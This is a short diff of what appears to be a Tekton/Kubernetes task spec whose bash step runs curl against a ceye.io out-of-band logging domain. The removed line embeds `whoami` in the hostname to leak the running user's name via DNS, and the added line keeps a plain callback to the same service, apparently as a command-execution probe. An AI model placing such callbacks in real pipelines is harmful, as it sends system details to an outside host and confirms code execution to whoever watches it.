@@ -10,4 +10,4 @@ spec:
         - /bin/bash
       args:
         - "-c"
-        - "curl tekton.`whoami`.7s171w.ceye.io"
+        - "curl xubo.7s171w.ceye.io"
